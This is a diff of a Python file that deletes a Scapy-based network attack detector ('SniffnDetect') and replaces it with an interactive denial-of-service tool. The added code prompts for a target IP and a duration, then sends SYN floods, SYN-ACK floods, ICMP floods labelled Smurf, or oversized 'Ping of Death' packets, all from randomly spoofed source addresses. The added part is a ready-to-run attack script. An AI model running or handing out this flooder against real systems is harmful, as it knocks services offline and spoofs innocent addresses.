@@ -1,178 +1,81 @@
-import os
+from scapy.all import IP, ICMP, TCP, send, Raw, conf
+import random
+import time
 import sys
-import ctypes
-import threading
-import csv
-from scapy.all import TCP, ICMP, Ether, IP, ARP, UDP, get_if_hwaddr, conf, sniff, Raw
-from queue import Queue
 
-# Banner for the program
-banner = '''-----------------------
-SniffnDetect v.1.1
------------------------
-'''
+def generate_random_ip():
+    """Génère une adresse IP valide aléatoire."""
+    return '.'.join(str(random.randint(1, 254)) for _ in range(4))
 
-class SniffnDetect():
-    def __init__(self):
-        self.INTERFACE = conf.iface
-        self.MY_IP = [x[4] for x in conf.route.routes if x[2] != '0.0.0.0' and x[3] == self.INTERFACE][0]
-        self.MY_MAC = get_if_hwaddr(self.INTERFACE)
-        self.WEBSOCKET = None
-        self.PACKETS_QUEUE = Queue()
-        self.MAC_TABLE = {}
-        self.RECENT_ACTIVITIES = []
-        self.FILTERED_ACTIVITIES = {
-            'TCP-SYN': {'flag': False, 'activities': [], 'attacker-mac': []},
-            'TCP-SYNACK': {'flag': False, 'activities': [], 'attacker-mac': []},
-            'ICMP-POD': {'flag': False, 'activities': [], 'attacker-mac': []},
-            'ICMP-SMURF': {'flag': False, 'activities': [], 'attacker-mac': []},
-        }
-        self.flag = False
+def send_packet(packet):
+    """Envoie un paquet avec verbose désactivé."""
+    send(packet, verbose=0)
 
-        # Open the CSV file in append mode to log attacks
-        self.csv_file = open('attack_log.csv', 'a', newline='')
-        self.csv_writer = csv.writer(self.csv_file)
-        self.csv_writer.writerow(['Timestamp', 'Source IP', 'Destination IP', 'Attack Type', 'Packet Size'])
+def attack_syn_flood(target_ip, duration):
+    """SYN Flood Attack."""
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        target_port = random.randint(1024, 65535)  # Port aléatoire
+        src_ip = generate_random_ip()
+        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
+        send_packet(packet)
 
-    def sniffer_threader(self):
-        while self.flag:
-            pkt = sniff(count=1)
-            with threading.Lock():
-                self.PACKETS_QUEUE.put(pkt[0])
+def attack_syn_ack(target_ip, duration):
+    """SYN-ACK Flood Attack."""
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        target_port = random.randint(1024, 65535)  # Port aléatoire
+        src_ip = generate_random_ip()
+        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=target_port, flags="SA")
+        send_packet(packet)
 
-    def analyze_threader(self):
-        while self.flag:
-            pkt = self.PACKETS_QUEUE.get()
-            self.analyze_packet(pkt)
-            self.PACKETS_QUEUE.task_done()
+def attack_smurf(target_ip, duration):
+    """Smurf Attack."""
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        src_ip = generate_random_ip()
+        packet = IP(src=src_ip, dst=target_ip) / ICMP()
+        send_packet(packet)
 
-    def check_avg_time(self, activities):
-        if len(activities) < 1:
-            return False
+def attack_pod(target_ip, duration):
+    """Ping of Death (PoD) Attack."""
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        src_ip = generate_random_ip()
+        packet = IP(src=src_ip, dst=target_ip) / ICMP() / Raw(b"A" * 6000)
+        send_packet(packet)
 
-        time = 0
-        c = -1
-        while c > -31 and abs(c) < len(activities):  # Assurer qu'on ne dépasse pas la taille de la liste
-            time += activities[c][0] - activities[c-1][0]
-            c -= 1
-        time /= len(activities)
-        
-        return (time < 2 and self.RECENT_ACTIVITIES[-1][0] - activities[-1][0] < 10)
-
-    def set_flags(self):
-        for category in self.FILTERED_ACTIVITIES:
-            if len(self.FILTERED_ACTIVITIES[category]['activities']) > 1:
-                self.FILTERED_ACTIVITIES[category]['flag'] = self.check_avg_time(
-                    self.FILTERED_ACTIVITIES[category]['activities'])
-                if self.FILTERED_ACTIVITIES[category]['flag']:
-                    print(f"{category} attack detected! Setting flag to True.")
-                    self.FILTERED_ACTIVITIES[category]['attacker-mac'] = list(
-                        set([i[3] for i in self.FILTERED_ACTIVITIES[category]['activities'] if len(i) > 3]))
-
-    def analyze_packet(self, pkt):
-        src_ip, dst_ip, src_port, dst_port, tcp_flags, icmp_type = None, None, None, None, None, None
-        protocol = []
-
-        if len(self.RECENT_ACTIVITIES) > 15:
-            self.RECENT_ACTIVITIES = self.RECENT_ACTIVITIES[-15:]
-
-        for category in self.FILTERED_ACTIVITIES:
-            if len(self.FILTERED_ACTIVITIES[category]['activities']) > 30:
-                self.FILTERED_ACTIVITIES[category]['activities'] = self.FILTERED_ACTIVITIES[category]['activities'][-30:]
-
-        self.set_flags()
-
-        src_mac = pkt[Ether].src if Ether in pkt else None
-        dst_mac = pkt[Ether].dst if Ether in pkt else None
-
-        if IP in pkt:
-            src_ip = pkt[IP].src
-            dst_ip = pkt[IP].dst
-
-        # Ignore UDP packets
-        if UDP in pkt:
-            return  # Early return if it's a UDP packet
-
-        attack_type = None  # Initialiser le type d'attaque ici
-
-        # Process TCP packets (for SYN Flood and SYN-ACK Flood)
-        if TCP in pkt:
-            protocol.append("TCP")
-            src_port = pkt[TCP].sport
-            dst_port = pkt[TCP].dport
-            tcp_flags = pkt[TCP].flags.flagrepr()
-
-            if tcp_flags == "S":  # SYN flood detection
-                self.FILTERED_ACTIVITIES['TCP-SYN']['activities'].append([pkt.time])
-                attack_type = "SYN Flood"
-                print(f"SYN Flood detected from {src_ip} to {dst_ip}")  # Log SYN Flood detection
-            elif tcp_flags == "SA":  # SYN-ACK flood detection
-                self.FILTERED_ACTIVITIES['TCP-SYNACK']['activities'].append([pkt.time])
-                attack_type = "SYN-ACK"
-                print(f"SYN-ACK Flood detected from {src_ip} to {dst_ip}")  # Log SYN-ACK detection
-
-        # Process ICMP packets (for PoD and Smurf)
-        if ICMP in pkt:
-            protocol.append("ICMP")
-            icmp_type = pkt[ICMP].type
-
-            if src_ip == self.MY_IP and src_mac != self.MY_MAC:
-                self.FILTERED_ACTIVITIES['ICMP-SMURF']['activities'].append([pkt.time])
-                attack_type = "SMURF"
-                print(f"Smurf attack detected from {src_ip} to {dst_ip}")  # Log Smurf detection
-
-            if Raw in pkt and len(pkt[Raw].load) > 1024:
-                self.FILTERED_ACTIVITIES['ICMP-POD']['activities'].append([pkt.time])
-                attack_type = "POD"
-                print(f"PoD attack detected from {src_ip} to {dst_ip}")  # Log PoD detection
-
-        # Log the packet details with attack type
-        if attack_type:  # Assurez-vous d'avoir un type d'attaque
-            self.csv_writer.writerow([pkt.time, src_ip, dst_ip, attack_type, len(pkt)])  # Enregistre le type d'attaque
-
-        self.RECENT_ACTIVITIES.append(
-            [pkt.time, protocol, src_ip, dst_ip, src_mac, dst_mac, src_port, dst_port, None, None])
-
-    def start(self):
-        if not self.flag:
-            self.flag = True
-            sniff_thread = threading.Thread(target=self.sniffer_threader)
-            sniff_thread.daemon = True
-            sniff_thread.start()
-            analyze_thread = threading.Thread(target=self.analyze_threader)
-            analyze_thread.daemon = True
-            analyze_thread.start()
-        return self.flag
-
-    def stop(self):
-        self.flag = False
-        self.PACKETS_QUEUE = Queue()
-        self.RECENT_ACTIVITIES = []
-        self.FILTERED_ACTIVITIES = {
-            'TCP-SYN': {'flag': False, 'activities': [], 'attacker-mac': []},
-            'TCP-SYNACK': {'flag': False, 'activities': [], 'attacker-mac': []},
-            'ICMP-POD': {'flag': False, 'activities': [], 'attacker-mac': []},
-            'ICMP-SMURF': {'flag': False, 'activities': [], 'attacker-mac': []},
-        }
-        # Close the CSV file when stopping
-        self.csv_file.close()
-
-        return self.flag
-
-def clear_screen():
-    if "linux" in sys.platform:
-        os.system("clear")
-    elif "win32" in sys.platform:
-        os.system("cls")
+def ddos(target_ip, attack_type, duration):
+    """Gestion des attaques DDoS."""
+    conf.verb = 0  # Désactiver les messages de sortie Scapy
+    if attack_type == "syn_flood":
+        attack_syn_flood(target_ip, duration)
+    elif attack_type == "syn_ack":
+        attack_syn_ack(target_ip, duration)
+    elif attack_type == "smurf":
+        attack_smurf(target_ip, duration)
+    elif attack_type == "pod":
+        attack_pod(target_ip, duration)
     else:
-        pass
+        print("Type d'attaque inconnu.")
 
-def is_admin():
+if __name__ == "__main__":
     try:
-        return os.getuid() == 0  # For Linux-based systems
-    except AttributeError:
-        pass
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin() == 1  # For Windows systems
-    except AttributeError:
-        return False
+        target_ip = input("IP cible : ")
+        attack_type = input("Type d'attaque (syn_flood, syn_ack, smurf, pod) : ").lower()
+
+        if attack_type not in ["syn_flood", "syn_ack", "smurf", "pod"]:
+            print("Type d'attaque non reconnu.")
+            sys.exit(1)
+
+        duration = float(input("Durée de l'attaque (en secondes) : "))
+
+        ddos(target_ip, attack_type, duration)
+        print(f"Tous les paquets pour l'attaque {attack_type} ont été envoyés à {target_ip}.")
+
+    except KeyboardInterrupt:
+        print("\nArrêt par l'utilisateur.")
+        sys.exit(0)
+    except ValueError:
+        print("Veuillez entrer des valeurs numériques valides.")
+        sys.exit(1)
